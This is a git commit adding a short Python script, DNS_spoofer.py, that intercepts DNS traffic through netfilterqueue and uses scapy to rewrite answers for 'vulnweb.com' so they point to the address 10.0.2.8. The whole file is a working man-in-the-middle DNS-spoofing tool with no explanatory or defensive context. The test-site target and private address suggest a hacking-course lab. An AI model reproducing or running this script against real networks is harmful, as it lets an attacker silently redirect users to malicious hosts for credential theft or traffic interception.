99912a927b9d80864f3427722233e70c9e1bb24e
ironspideytrip <54668558+ironspideytrip@users.noreply.github.com>
2020-08-01 03:03:38 +0530

    Create DNS_spoofer.py

---
+++ DNS_spoofer.py
@@ -0,0 +1,20 @@
+import netfilterqueue
+import scapy.all as scapy
+def process_packet(packet):
+	scapy_packet=scapy.IP(packet.get_payload())
+	if scapy_packet.haslayer(scapy.DNSRR):
+		qname=scapy_packet[scapy.DNSQR].qname
+		if "vulnweb.com" in qname:
+			answer=scapy.DNSRR(rrname=qname,rdata="10.0.2.8")
+			scapy_packet[scapy.DNS].an=answer
+			scapy_packet[scapy.DNS].ancount=1
+			del scapy_packet[scapy.IP].len
+			del scapy_packet[scapy.UDP].len
+			del scapy_packet[scapy.IP].chksum
+			del scapy_packet[scapy.UDP].chksum
+			packet.set_payload(str(scapy_packet))
+	packet.accept()
+
+queue=netfilterqueue.NetfilterQueue()
+queue.bind(0,process_packet)
+queue.run()
